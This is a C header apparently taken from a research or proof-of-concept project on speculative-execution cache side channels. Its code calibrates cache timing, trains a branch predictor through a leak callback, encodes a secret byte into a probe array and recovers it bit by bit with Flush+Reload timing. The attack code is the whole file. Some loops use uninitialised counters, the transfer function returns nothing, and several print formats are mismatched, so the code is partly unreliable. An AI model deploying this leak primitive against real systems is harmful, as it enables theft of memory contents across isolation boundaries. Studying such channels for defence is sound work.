#include <stdint.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
#include "../include/instructions.h"
#include "../include/constants.h"


#ifndef CBSC_MEASUREMENT_TRANSFER_H
#define CBSC_MEASUREMENT_TRANSFER_H


uint32_t get_average()
{
    uint8_t addresses[NUMBER_OF_MEASUREMENTS*CACHE_LINE_SIZE];

    uint32_t measurements[NUMBER_OF_MEASUREMENTS];

    for (uint32_t i = 0; i < NUMBER_OF_MEASUREMENTS; i++)
    {
        clflush(addresses + (i * CACHE_LINE_SIZE));
        measurements[i] = access_time(addresses + (i * CACHE_LINE_SIZE));
    }

    uint32_t sum = 0;
    for (uint32_t i = 0; i < NUMBER_OF_MEASUREMENTS; i++)
    {
        sum += measurements[i];
        printf("Flushed: %i\n", measurements[i]);
    }

    return sum / NUMBER_OF_MEASUREMENTS;
}
uint32_t get_average_cached()
{
    uint8_t addresses[NUMBER_OF_MEASUREMENTS*CACHE_LINE_SIZE];

    uint32_t measurements[NUMBER_OF_MEASUREMENTS];

    // Warming up Cache
    for (uint32_t i = 0; i < 16; i++)
    {
        for (uint32_t i = 0; i < NUMBER_OF_MEASUREMENTS; i++)
        {
            addresses[i*CACHE_LINE_SIZE] *= addresses[i*CACHE_LINE_SIZE];
        }
    }

    for (uint32_t i = 0; i < NUMBER_OF_MEASUREMENTS; i++)
    {
        addresses[i*CACHE_LINE_SIZE] *= addresses[i*CACHE_LINE_SIZE];
        measurements[i] = access_time(&addresses[i*CACHE_LINE_SIZE]);
    }

    uint32_t sum = 0;
    for (uint32_t i = 0; i < NUMBER_OF_MEASUREMENTS; i++)
    {
        sum += measurements[i];
        printf("Cached: %i\n", measurements[i]);
    }

    return sum / NUMBER_OF_MEASUREMENTS;
}

bool is_cached(uint8_t *address, size_t threshold)
{
    size_t time = access_time(address);
    printf("Address %ld cycles: %d\n", address, time);
    if (time < threshold)
        return true;
    return false;
}

uint32_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len,
                        uint8_t secret, uint8_t channel[NUMBER_TRANSFER_BITS]),
         uint8_t *in, uint32_t in_len, uint8_t *out, uint32_t out_len, size_t threshold)
{
    // creating transfer array
    uint8_t side_channel[NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE];
    uint32_t out_index = 0;
    bool training;

    uint32_t train_data[TRAIN_DATA_LENGTH * CACHE_LINE_SIZE];
    for (uint32_t i; i < TRAIN_DATA_LENGTH * CACHE_LINE_SIZE; i++)
    {
        train_data[i] = i+1;
    }

    // empty the output array
    memset(out, 0, out_len);

    // transfering all elements in input array to output array
    for (uint32_t data_index = 0; data_index < in_len && data_index < out_len; data_index++)
    {
        // flushing the transfer array, before encoding data into it
        memset(side_channel,5, NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE);

        for (uint32_t i; i < TRAIN_DATA_LENGTH * CACHE_LINE_SIZE; i++)
            clflush(&train_data[i]);

        // training the predictor
        for (uint32_t i = 0; i < (TRAIN_DATA_LENGTH * CACHE_LINE_SIZE) - 1; i += CACHE_LINE_SIZE)
        {
            training = leak_data(i, train_data, TRAIN_DATA_LENGTH * CACHE_LINE_SIZE, in[data_index], side_channel);
            //printf("Training: %d\n", training);
        }

        for (uint32_t i = 0; i < NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE; i += CACHE_LINE_SIZE)
            clflush(&side_channel[i]);

        maccess(&in[data_index]);

        lfence();
        mfence();
        
        // writing secret into the side channel array
        training = leak_data((TRAIN_DATA_LENGTH * CACHE_LINE_SIZE) - 1, train_data, TRAIN_DATA_LENGTH * CACHE_LINE_SIZE, in[data_index], side_channel);
        printf("Training: %d\n", training);

        char binaryResult[NUMBER_TRANSFER_BITS + 1];
        memset(binaryResult, 0, NUMBER_TRANSFER_BITS + 1);
        // reading data from the side channel array
        for (uint32_t i = 0; i < NUMBER_TRANSFER_BITS; i++)
        {
            if (is_cached(side_channel + (i * CACHE_LINE_SIZE), threshold)){
                out[data_index] += DOUBLE_TIMES(1, i % 8);
                binaryResult[i] = '1';
            }
            else {
                binaryResult[i] = '0';
            }
        }
        printf("%s\n", binaryResult);
    }
}
#endif